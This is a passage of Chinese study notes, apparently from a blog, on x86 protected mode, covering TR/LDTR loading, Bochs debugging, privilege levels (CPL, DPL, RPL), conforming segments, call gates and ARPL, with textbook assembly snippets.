<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/05f3b2181bc5fcf58539e83c149ef293.png" class="">
<p><mark>TR&amp;LDTR</mark>结构：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1508e59aad6f3af7980b3a068664d8e9.png" class="">

<p><mark>TR&amp;LDTR</mark>可以使用<mark>ltr&amp;lldt</mark>指令加载：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/786156d01803a7590541675d193fdcde.png" class="">
<p><mark>LDTR</mark>加载过程：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/1b905e09c73bf3c3c1d77e200f5758d7.png" class="">

<ul>
<li><strong>lldt r/m16</strong>指令执行时，将选择子送入<strong>LDTR</strong>的LDT选择器中；</li>
<li>处理器从<strong>GDT</strong>中取出<strong>LDT</strong>描述符；</li>
<li>将<strong>LDT</strong>描述符中的<strong>LDT</strong>线性基地址送入<strong>LDT描述符高速缓存器中的32位线性基地址</strong>部分；</li>
<li>之后<strong>LDTR</strong>就指向<strong>LDT</strong>；</li>
</ul>
<p><mark>TR</mark>加载过程：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/ecadab5ad4f6f0d59de9f22e0a8c42f9.png" class="">

<ul>
<li><strong>ltr r/m16</strong>指令执行时，将选择子送入TR的TSS选择器中；</li>
<li>处理器从<strong>GDT</strong>中取出<strong>TSS</strong>描述符；</li>
<li>将<strong>TR</strong>描述符中的<strong>TSS</strong>线性基地址送入<strong>TR描述符高速缓存器中的32位线性基地址</strong>部分；</li>
<li>之后<strong>TR</strong>就指向<strong>TSS</strong>；</li>
</ul>
<p>加载完之后就跳转用户程序执行。</p>
<h2 id="13-在虚拟机上验证人物的执行"><a href="#13-在虚拟机上验证人物的执行" class="headerlink" title="13. 在虚拟机上验证人物的执行"></a>13. 在虚拟机上验证人物的执行</h2><p>写数据并执行：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/fc609296920402a864a71c3c4003d99d.png" class="">
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/3460dbd92cd27aadcd34d7ecd03e5a18.png" class="">
<p>Bochs虚拟机：<br>在0x7c00（主引导程序）断下来之后设置<mark>modbp<mark>断点，会在从实模式切换到保护模式的时候断下来。</mark></mark></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/0ce3eb8e6bbc3727718a4c8430f3ad4b.png" class="">
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/74325049411650aa30b1c896a5631a66.png" class="">

<p>进入内核：</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/32f951f463d45ebd695f1df9b36bc3be.png" class="">

<p>执行完<mark>lldt</mark>指令之后看一下寄存器的状态：<strong>ldtr和gdtr</strong>的内容</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/2dc168b9cc4ac2f907d58cc0efb1e95e.png" class="">

<p>查看<strong>GDT</strong>内容：<strong>info gdt</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/b2344de727b335d75477e107d2561bfa.png" class="">
<p>查看描述符详细信息：<strong>info gdt 5</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/f282e04e9d4a6ad7737ec2397b870111.png" class="">

<p>查看<strong>LDT</strong>内容以及每个描述符的详细信息：<strong>info ldt</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/a482da14f8170c07d4ca4d2d4efc14ad.png" class="">

<p>查看<strong>TSS</strong>信息：<strong>info tss</strong></p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/61ce088f2f0a21ae4ec28b11e8ab7c9d.png" class="">

<p>运行结果：正常执行</p>
<img src="/2022/12/11/27-%E4%BB%BB%E5%8A%A1%E5%92%8C%E4%BB%BB%E5%8A%A1%E7%9A%84%E5%88%9B%E5%BB%BA/image-20221113164719509.png" class="" title="image-20221113164719509">
]]></content>
      <categories>
        <category>X86汇编：实模式到保护模式</category>
      </categories>
      <tags>
        <tag>x86内核任务系统</tag>
      </tags>
  </entry>
  <entry>
    <title>特权级和特权级保护</title>
    <url>/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/</url>
    <content><![CDATA[<h2 id="1-特权级保护的必要性和特权保护机制"><a href="#1-特权级保护的必要性和特权保护机制" class="headerlink" title="1. 特权级保护的必要性和特权保护机制"></a>1. 特权级保护的必要性和特权保护机制</h2><p>用描述符实施段与段之间的隔离和保护，建立在程序之间分工协作的基础上，首先用户程序需要在内核的支持下运行而不能独立运行。</p>
<p>内核需要加载和重定位用户程序，为用户程序每个段创建描述符，将段选择子回填到用户程序的头部中，因为这个原因用户程序只能访问自己的代码段、数据段和栈段。</p>
<span id="more"></span>

<p>当然这样并不能有效地阻止用户程序访问GDT，如下代码：</p>
<pre><code class="assembly">        mov eax, 0x28		;00101_0_00
        mov ds, eax
        mov dword[0],012345678
</code></pre>
<p>用户程序虽然不知道5号描述符指向哪个段，但是仍然可以破坏段中的数据，甚至用户可以重新定义一个新的GDT来替换内核建立的GDT，从而达到破坏的目的。</p>
<p>用户程序只要知道内核中历程的<strong>段选择子</strong>和<strong>段内偏移</strong>就可以调用例程执行，这样会很容易的破坏内核。</p>
<p>系统的多任务如下：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b419bbd59816da11bea31176df362915.png" class="">

<p>使用特权级来划分内核和用户程序，任务的共有部分和私有部分之间的隔离特权级从<strong>0~3</strong>。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/8301c8a1961eaafdfde4afbc833cac75.png" class="">

<p>特权指令：只有<strong>0特权级</strong>的程序能够执行</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/534123fc9756c0c8be4702bce7bde3e5.png" class="">

<h2 id="02-当前特权级CPL"><a href="#02-当前特权级CPL" class="headerlink" title="02. 当前特权级CPL"></a>02. 当前特权级CPL</h2><p>特权级是以处理器的工作特点和工作方法来划分的。</p>
<p>处理器不知道当前执行的是哪个程序，但是可以知道是哪个段：因为要用到段寄存器</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/5ab45bab78a1b750e50617a784d7958d.png" class="">

<p>程序的特权级就是：组成这个程序的所有代码的特权级。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/e82baf2eb98a7295eaa51f004738ba24.png" class="">

<p>处理器正在执行哪个段，其特权级就是<strong>当前特权级CPL（Current Priviledge Level）</strong>，也即是当前正在执行的程序的特权级。</p>
<p>那么在哪里体现CPL呢？段寄存器如下：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/1f1bc764623aea4d27976f445a600fc8.png" class="">

<p>段选择器：低两位保存<strong>CPL</strong>。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/930d0c64fd66fcda8b7f6fb7b7578d74.png" class="">

<p>也有例外，如下：</p>
<pre><code class="assembly">         mov cr0,eax                        ;设置PE位
      
         ;以下进入保护模式... ...
         jmp dword 0x0010:flush             ;16位的描述符选择子：32位偏移
                                            ;清流水线并串行化处理器  
</code></pre>
<p>当然<strong>CR0</strong>的<strong>PE</strong>位进入保护模式之后，处理器自动处于0特权级，但是这个特权级无法使用<strong>CS</strong>的段选择器来指示，因为这时候CS的段选择器中仍然保存着实模式下的逻辑段地址，而不是段选择子。之后在执行了<strong>jmp</strong>指令之后，<strong>CS</strong>才会被刷新，用来指示当前特权级。</p>
<p>在引入保护模式和特权级之后，实模式被赋予了新的内涵，实模式下的成刷始终是<strong>0特权级的</strong>，在进入保护模式之后，处理器是继承了实模式下的<strong>0特权级</strong>。</p>
<h2 id="03-描述特权级DPL"><a href="#03-描述特权级DPL" class="headerlink" title="03. 描述特权级DPL"></a>03. 描述特权级DPL</h2><p>描述特权级**DPL(Descriptor Privilege Level)**：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/07a549e08584fbe0e41ba5c7e84d9ad2.png" class="">
<p>描述符特权级用来描述指定的<strong>实体</strong>的特权级，即描述符描述的是一个段，那么DPL就是这个段的特权级。对于一个正在执行的代码段，其<strong>CPL</strong>和当前的<strong>DPL</strong>是一致的。</p>
<p>程序在不同的代码段内执行，那么<strong>CPL</strong>就要等于目标代码段的<strong>DPL</strong>。即控制转移只能发生在两个特权级相同的代码段之间，<br>例如：<strong>CS</strong>指向<strong>代码段A</strong>、<strong>CPL = 0</strong>；<strong>代码段B</strong>的<strong>DPL</strong>要等于0<br>才能从<strong>代码段A</strong>跳转到<strong>代码段B</strong>内执行。</p>
<p>当然也可以中一个<strong>低特权级的代码段</strong>转移到一个<strong>高特权级的代码段</strong>去执行，需要特殊的方法。但是无论如何都不能从一个<strong>高特权级的代码段</strong>转移到一个<strong>低特权级的代码段</strong>内执行。</p>
<p>访问数据时的特权级：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/94509260f80233f558f8f1b5e7ef419c.png" class="">
<p>再当前代码段内访问数据段，那么<strong>当前代码段的特权级</strong>需要大于<strong>目标数据段的特权级</strong>，即<mark>CPL ≤ DPL</mark>。代码段特权级特别低的话表示其可靠性和安全性不高不允许其访问高特权级的数据段。</p>
<p>上一章代码中，从<strong>引导程序跳转执行内核程序</strong>时，两者特权级都是0，可以跳转。从内核程序跳转执行用户称刷时，两者特权级均为0，可以跳转。其中执行<strong>ldt、lldt</strong>这些只能再0特权级执行的指令也是合法的。</p>
<h2 id="04-任务公共部分和私有部分的特权级划分"><a href="#04-任务公共部分和私有部分的特权级划分" class="headerlink" title="04. 任务公共部分和私有部分的特权级划分"></a>04. 任务公共部分和私有部分的特权级划分</h2><p>一个任务由内核和用户程序共同组成，当内核为用户程序创建描述符时，将用户程序的特权级设置为3，内核的特权级设置为0。</p>
<p>在代码中：将我们之前建立程序头部段时设置的<strong>0特权级</strong>改为<strong>3</strong></p>
<pre><code class="assembly">    ;建立程序头部段描述符
    mov eax,edi                        ;程序头部起始线性地址
    mov ebx,[edi+0x04]                 ;段长度
    dec ebx                            ;段界限
    ;mov ecx,0x00409200                 ;字节粒度的数据段描述符，特权级0
    mov ecx,0x0040F200                 ;字节粒度的数据段描述符，特权级3
    call sys_routine_seg_sel:make_seg_descriptor
</code></pre>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/21e0a05746b3ca89b979aa879ef39027.png" class="">
<p>同上，将代码段、数据段、栈段的特权级均改为<strong>3</strong>。</p>
<p>但是只修改特权级的话程序将不能运行，因为当前内核的<strong>CPl = 0</strong>，用户程序<strong>DPL = 3</strong>，在任何情况下都是不允许<strong>jmp、call</strong>指令从高特权级向低特权级转移执行的。就算能进入用户程序，则当前的<strong>CPL = 3</strong>，在用户程序中去调用内核的例程也是不被允许的。</p>
<p>调试程序，在内核跳转执行用户程序时中断：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/aef51c4b0badee6b9acb78698418b58e.png" class="">
<p>显示特权级检查没有通过。</p>
<h2 id="05-依从的代码段"><a href="#05-依从的代码段" class="headerlink" title="05. 依从的代码段"></a>05. 依从的代码段</h2><p>处理器原则上不允许两个不同特权级的代码段转移执行，但是符合一定条件是可以的。</p>
<p><strong>方法一</strong>：将目标代码段设置为依从的代码段，<strong>依从的代码段</strong>即使其特权级较高也可以从地特权代码段进入。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/bf5c5802fb0efd9aa47e3c5ea19606c3.png" class="">

<ul>
<li>S位：为1表示储存器的段描述符</li>
<li>X位：为1表示代码段</li>
<li>C位：为0表示普通的代码段，为1表示依从的代码段，一个代码段是依从的表示可以种低特权级进入、但是不能从高特权级进入（<mark>当前代码段的CPL</mark> <strong>≤</strong> <mark>依从代码段DPL</mark>）<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/357d06dc5af6b68e954f64083a703693.png" class=""></li>
</ul>
<p>上图中右边CPL = 3可以转移到左边DPL = 2的代码段执行。转移之后程序是在CPL = 3的特权级上执行，而不是在依从代码段的DPL = 2特权级上去执行。</p>
<h2 id="06-门描述符和调用门"><a href="#06-门描述符和调用门" class="headerlink" title="06. 门描述符和调用门"></a>06. 门描述符和调用门</h2><p>接上一节。</p>
<p><strong>方法二</strong>：通过门实施转移</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/46d157cd6a850257a170db6bef97d529.png" class="">
<p>门描述符描述的是一些系统管理单元，比如描述一个任务、描述一个例程或子程序。</p>
<p>如果门描述符描述的是一个例程，就称之为调用门。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a1a23292b0b75c5a5ecea52a8711ef52.png" class="">
<p>如果高特权级是依从的，可以从<strong>低特权级</strong>向<strong>高特权级</strong>代码段转移执行。<br>若不是依从的，通过调用门也可以从<strong>低特权级</strong>向<strong>高特权级</strong>代码段转移执行。</p>
<p>调用门格式：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/9c63e6118a4b5d90f57026030116f767.png" class="">

<ul>
<li>S：为0表示系统描述符</li>
<li>TYPE：为<strong>1100</strong>表示调用门、描述的是一个例程</li>
<li>P：为0表示调用门无效、为1表示有效；</li>
<li>DPL：表示调用门本身的特权级</li>
<li>高32位的0~4位：保存用栈传递的参数的个数最大能表示<strong>2^5 - 1= 31</strong>个。</li>
</ul>
<p>调用门涉及三个部分：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/7a71dc22360260834fc29c2314f4ae8a.png" class="">

<ol>
<li>当前代码段特权级CPL</li>
<li>调用门描述符的DPL</li>
<li>目标代码段描述符的DPL<br>需要符合：数值上有目标代码段描述符的DPL ≤ 当前代码段特权级CPL ≤ 调用门描述符的DPL。<br>比如这个需要CPL为1或者2的时候才能通过调用门<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/179ec831c689c14a57937406b425c4a8.png" class=""></li>
</ol>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/d7a0f0d99381f9de92b714d40e670c7b.png" class="">

<ul>
<li>用<strong>CALL</strong>指令通过调用门之后可以返回，通过之后处理器在目标代码段的特权级上执行，即CPL由低到高。</li>
<li>用<strong>JMP</strong>指令通过调用门之后不可以返回，通过之后特权级不变还是在原来的特权级上执行。</li>
</ul>
<p>调用一个例程时，可以使用寄存器和栈传递参数，调用者通过调用门之后将参数压栈，返回时从栈中返回参数。</p>
<p>但是通过调用门之后特权级可能改变当前特权级指令CPL，从低特权级变为高特权级。此时处理器要求栈也必须切换，从低特权级的栈切换到高特权级的栈，还要复制参数，为了防止栈出错调用门描述符中需要保存要传递参数的数量，保存在高32位的0~4中最多表示<strong>2^5 - 1= 31</strong>个。</p>
<h2 id="07-本章程序说明及特权级检查的时机"><a href="#07-本章程序说明及特权级检查的时机" class="headerlink" title="07. 本章程序说明及特权级检查的时机"></a>07. 本章程序说明及特权级检查的时机</h2><p>本章程序有：<br>主引导程序：c13_mbr0.asm<br>内核程序：c14_core2.asm<br>用户程序：c13_app1.asm</p>
<p>进入保护模式之后就要进行特权级指令检查，<mark>jmp far</mark>指令进入内核执行，需要进行特权级检查。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/19fb2ada53ec9c2d25bee32c3cf3efc2.png" class="">

<ol>
<li>上图中下面两行不需要进行特权级检查，虽然需要访问段中数据，但是在访问前需要指定段的位置。</li>
<li>就如前两行代码，将一个段选择子传入段寄存器DS时，要检查当前特权级CPL是否高于等于<strong>目标数据段描述符的DPL</strong>，即数值上<strong>当前CPL ≤ 目标数据段DPL</strong>。</li>
<li>若通过检查表示DS会被加载，那么后续的内存访问指令都是合法的，如果不通过检查，后续的指令就没有机会成功执行。</li>
<li>特权级检查的典型时机如下：其中特权指令只能在<strong>0特权级</strong>下执行。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/5186d52211a8cb78f11eb44a06f5d991.png" class="">
本章程序可以从0特权级的内核进入3特权级的用户程序执行，也可以在3特权级的用户程序中使用0特权级的接口例程。</li>
</ol>
<h2 id="08-请求特权级RPL"><a href="#08-请求特权级RPL" class="headerlink" title="08. 请求特权级RPL"></a>08. 请求特权级RPL</h2><p>本章程序：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/a2468104e567c496d0c363e19f33c8ce.png" class="">

<ol>
<li>用户程序中<strong>CPL = 3</strong>，调用门中的<strong>DPL = 3</strong>，内核代码段的<strong>DPL = 0</strong>，满足条件可以执行转移。转移之后处理器以<strong>CPL = 0</strong>特权级执行</li>
<li>在内核的硬盘读写例程中将数据段的选择子传送给DS，需要进行特权级检查，由高特权级高特权级的代码段可以访问低特权级或同级的数据段，在本程序中硬盘读写例程中<strong>CPL = 0</strong> ≤ 用户程序数据段的<strong>DPL = 3</strong>，即满足条件通过检查。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/838c8deb87ba21672c488901d70d756c.png" class="">
若用户程序通过调用门执行内核的硬盘的读写例程时传递的<strong>数据段选择子是内核数据段选择子</strong>，那么在将数据段选择子传递给DS时也可以通过检查，那么用户程序就可以通过调用门破坏内核数据段了。</li>
</ol>
<p>说明只是依靠<strong>当前代码段特权级CPL</strong>和<strong>目标数据段描述符特权级DPL</strong>进行特权级检查时不够充分的。</p>
<p>在这里要访问数据段的是用户程序，用户程序自己不能访问外部设备，它需要通过请求内核硬盘读写例程去访问一个数据段，在内核硬盘读写例程中当前<strong>CPL = 0</strong>，之前是3，说明请求者的信息被隐藏了。</p>
<p>如果能够恢复请求者身份，知道它是3级特权的用户程序，就能够知道不允许它去访问<strong>0特权级</strong>的内核数据段，将内核数据段选择子传递到DS的请求也就不可能执行，这个问题不能只靠处理器来解决。</p>
<p>在访问一个数据段之前，需要将段选择子传送到DS的段选择器，在进行这个操作时进行特权级检查<br>段选择子：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/b15db26cb1d6aca2e7c439c29bf7778e.png" class="">
<p>其中RPL（Request Privilege Level）表示请求者的特权级，那么检查如下：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/33bcf125a7d94c25d79aef9e8646da2e.png" class="">
<p>对于RPL的检查已经内置到处理器中，由处理器固件完成的是一个例行的操作。因此当程序员意识到请求着不是当前程序或当前代码段，而是一个低特权级的程序，那么在硬盘读写例程中：</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/4119cb107ccd78184897262995691708.png" class="">
<p>此时就可以检查出请求者的特权级RPL低于内核数据段特权级DPL，在数值上有<strong>RPL = 3 ≥ DPL = 0</strong>，不满足条件，指令终止处理器产生一个异常中断。</p>
<h2 id="09-请求特权级调整指令ARPL"><a href="#09-请求特权级调整指令ARPL" class="headerlink" title="09. 请求特权级调整指令ARPL"></a>09. 请求特权级调整指令ARPL</h2><p>在程序中：</p>
<pre><code class="assembly">;-------------------------------------------------------------------------------
    ;此例程用于说明如何通过请求特权级RPL解决因请求者身份与CPL不同而带来的安全问题
    read_hard_disk_with_gate:		;从硬盘读取一个逻辑扇区
                                    ;输入：PUSH 逻辑扇区号
                                    ;      PUSH 目标缓冲区所在段的选择子
                                    ;      PUSH 目标缓冲区在段内的偏移量
                                    ;返回：无
    push eax
    push ebx
    push ecx
    
    mov ax,[esp+0x10]				;获取调用者的CS
    arpl [esp+0x18],ax              ;将数据段选择子调整到真实的请求特权级别
    mov ds,[esp+0x18]               ;用真实的段选择子加载段寄存器DS
    
    mov eax,[esp+0x1c]              ;从栈中取得逻辑扇区号
    mov ebx,[esp+0x14]              ;从栈中取得缓冲区在段内的偏移量
    
    ;此部分的功能是读硬盘，并传送到缓冲区，予以省略。
    
    retf 12
</code></pre>
<p>假定已经为这个例程创建调用门，调用门的特权级是3，这个例程可以从特权级3的用户程序调用。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/30e1a68b76aac209728ae085a24b8ea0.png" class="">
<p>在CS的低2位就是进入当前例程前请求者的特权级，将其取出传送给数据段选择子的RPL字段，即可修改请求者的特权级。使用ARPL指令修改。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/22c1deda038e307144472e86469a1c6c.png" class="">
<p>ARPL指令比较两个操作数的低2位，若<strong>目的操作数RPL</strong> &lt; <strong>源操作数RPL</strong>，则修改目的操作数的RPL，使其与源操作数RPL保持一致，同时标志寄存器的0标志位<strong>ZF = 1</strong>。否则不改变目的操作数的RPL，标志寄存器的0标志位<strong>ZF清零</strong>。</p>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/e604325a309c96f47dd42c8c2e3bd8c7.png" class="">
<p>代码最后，指令<strong>retf 12</strong>表示由被调用者来保持堆栈平衡，传入三个参数，一个参数4个字节，共12个字节。</p>
<h2 id="10-一般情况下的请求特权级设置"><a href="#10-一般情况下的请求特权级设置" class="headerlink" title="10. 一般情况下的请求特权级设置"></a>10. 一般情况下的请求特权级设置</h2><p>绝大多数时候，请求者就是当前代码段或者当前程序，此时只需要将段选择子的RPL设置成当前当前特权级CPL就可以了。<br><mark>c13_mbr0.asm</mark>程序中：</p>
<pre><code class="assembly">         ;以下进入保护模式... ...
         jmp dword 0x0010:flush             ;16位的描述符选择子：32位偏移
                                            ;清流水线并串行化处理器  
</code></pre>
<ol>
<li>此时当前特权级<strong>CPL为0</strong>，是从实模式继承来的；</li>
<li>请求特权级<strong>RPL</strong>位于选择子<mark>0x0010 = 0000000000010_0_00</mark>中，其中<strong>RPL = 0</strong>；</li>
<li>转移的目标位置是初始代码段，其中DPL为00。<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/49141991bb016a8848bfa17c75991426.png" class="">
因此在此条指令执行时，<strong>CPL = RPL = DPL</strong>，可以通过特权级检查。</li>
</ol>
<p>进入保护模式设置数据段：</p>
<pre><code class="assembly">    mov eax, 0x0008		;0x0008 = 0000000000001_0_00 
    mov ds, eax
</code></pre>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/32983c8cc1a5e803ea6bf07aac2c1d15.png" class="">

<ol>
<li>此时<strong>CPL = 0</strong>；</li>
<li>请求特权级在选择子<strong>0x0008</strong>，即请求特权级<strong>RPL = 0</strong>；</li>
<li>目标数据段是4G字节数据段，其中描述符<strong>DPL = 0</strong>;<br>能够通过特权级检查</li>
</ol>
<p>接下来设置栈段：</p>
<pre><code class="assembly">    mov eax,0x0018                      ;加载堆栈段选择子 11：00011_0_00
    mov ss,eax
    xor esp,esp                         ;堆栈指针 &lt;- 0 
</code></pre>
<img src="/2022/12/11/28-%E7%89%B9%E6%9D%83%E7%BA%A7%E5%92%8C%E7%89%B9%E6%9D%83%E7%BA%A7%E4%BF%9D%E6%8A%A4/23e9f4fd8b39015b6e7e6e5c8528b1ee.png" class="">

<ol>
<li>此时CPL = 0；</li>
<li>请求特权级在选择子0x0018，即请求特权级RPL = 0；</li>
<li>目标数据段是栈段，其描述符中DPL = 0；</li>
<li>能够通过特权级检查</li>
</ol>
<h2 id="11-为内核接口例程创建调用门"><a href="#11-为内核接口例程创建调用门" class="headerlink" title="11. 为内核接口例程创建调用门"></a>11. 为内核接口例程创建调用门</h2><p>进入内核之后使用指令<strong>call sys_routing_seg_sel:put_string</strong>在内核中转移是允许的，因为<strong>内核公共例程段的特权级</strong>和<strong>内核代码段的特权级</strong>是相同的，都是0特权级可以直接调用。但是用户程序的特权级是3，所以要为那些提供给用户程序使用的例程创建调用门。</p>
<p>在内核的核心数据段中定义了符号地址检索表，其中有例程的名字，例程所在段的段内偏移，例程所在段的段内选择子。现在分别为这些例程创建调用门，并且把它们<strong>例程所在段选择子</strong>改为<strong>调用门选择子</strong>。</p>
<p>创建调用门的代码如下：</p>
<pre><code class="assembly">         ;以下开始安装为整个系统服务的调用门。特权级之间的控制转移必须使用门
         mov edi,salt                       ;C-SALT表的起始位置
         mov ecx,salt_items                 ;C-SALT表的条目数量
  .b3:
         push ecx
         mov eax,[edi+256]                  ;该条目入口点的32位偏移地址
         mov bx,[edi+260]                   ;该条目入口点的段选择子
         mov cx,1_11_0_1100_000_00000B      ;特权级3的调用门(3以上的特权级才
                                            ;允许访问)，0个参数(因为用寄存器
                                            ;传递参数，而没有用栈)
         call sys_routine_seg_sel:make_gate_descriptor
         call sys_routine_seg_sel:set_up_gdt_descriptor
         mov [edi+260],cx                   ;将返回的门描述符选择子回填，此时默认RPL=0
         add edi,salt_item_len              ;指向下一个C-SALT条目
         pop ecx
         loop .b3
</code></pre>
<p>其中调用门描述符：</p>
